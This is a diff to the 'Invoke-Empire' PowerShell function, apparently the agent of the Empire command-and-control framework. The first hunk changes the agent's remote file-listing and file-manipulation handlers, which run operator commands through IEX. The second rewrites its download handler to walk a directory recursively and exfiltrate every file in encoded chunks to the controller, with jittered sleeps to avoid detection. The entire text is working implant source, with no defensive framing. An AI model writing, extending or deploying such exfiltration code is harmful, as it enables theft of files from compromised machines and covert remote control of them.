@@ -279,20 +279,20 @@ function Invoke-Empire {
         }
         else {
             switch -regex ($cmd) {
-                '(ls|dir)' {
+                '(ls|^dir)' {
                     if ($cmdargs.length -eq "") {
-                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name
+                        $output = Get-ChildItem -force | select mode,lastwritetime,length,name
                     }
                     else {
                         try{
-                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name"
+                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select lastwritetime,length,name"
                         }
                         catch [System.Management.Automation.ActionPreferenceStopException] {
                             $output = "[!] Error: $_ (or cannot be accessed)."
                         }
                     }
                 }
-                '(mv|move|copy|cp|rm|del|rmdir)' {
+                '(mv|move|copy|cp|rm|del|rmdir|mkdir)' {
                     if ($cmdargs.length -ne "") {
                         try {
                             IEX "$cmd $cmdargs -Force -ErrorAction Stop"
@@ -840,37 +840,39 @@ function Invoke-Empire {
                         $ChunkSize = 1024KB
                     }
 
-                    # resolve the complete path
-                    $Path = Get-Childitem $Path | ForEach-Object {$_.FullName}
+                    # resolve the complete paths
+                    $Path = Get-Childitem -Recurse $Path -File  | ForEach-Object {$_.FullName}
 
-                    # read in and send the specified chunk size back for as long as the file has more parts
-                    $Index = 0
-                    do{
-                        $EncodedPart = Get-FilePart -File "$path" -Index $Index -ChunkSize $ChunkSize
+                    foreach ( $File in $Path) {
+                        # read in and send the specified chunk size back for as long as the file has more parts
+                        $Index = 0
+                        do{
+                            $EncodedPart = Get-FilePart -File "$file" -Index $Index -ChunkSize $ChunkSize
 
-                        if($EncodedPart) {
-                            $data = "{0}|{1}|{2}" -f $Index, $path, $EncodedPart
-                            (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID))
-                            $Index += 1
+                            if($EncodedPart) {
+                                $data = "{0}|{1}|{2}" -f $Index, $file, $EncodedPart
+                                (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID))
+                                $Index += 1
 
-                            # if there are more parts of the file, sleep for the specified interval
-                            if ($script:AgentDelay -ne 0) {
-                                $min = [int]((1-$script:AgentJitter)*$script:AgentDelay)
-                                $max = [int]((1+$script:AgentJitter)*$script:AgentDelay)
+                                # if there are more parts of the file, sleep for the specified interval
+                                if ($script:AgentDelay -ne 0) {
+                                    $min = [int]((1-$script:AgentJitter)*$script:AgentDelay)
+                                    $max = [int]((1+$script:AgentJitter)*$script:AgentDelay)
 
-                                if ($min -eq $max) {
-                                    $sleepTime = $min
+                                    if ($min -eq $max) {
+                                        $sleepTime = $min
+                                    }
+                                    else{
+                                        $sleepTime = Get-Random -minimum $min -maximum $max;
+                                    }
+                                    Start-Sleep -s $sleepTime;
                                 }
-                                else{
-                                    $sleepTime = Get-Random -minimum $min -maximum $max;
-                                }
-                                Start-Sleep -s $sleepTime;
                             }
-                        }
-                        [GC]::Collect()
-                    } while($EncodedPart)
+                            [GC]::Collect()
+                        } while($EncodedPart)
 
-                    Encode-Packet -type 40 -data "[*] File download of $path completed" -ResultID $ResultID
+                        Encode-Packet -type 40 -data "[*] File download of $file completed" -ResultID $ResultID
+                    }
                 }
                 catch {
                     Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID
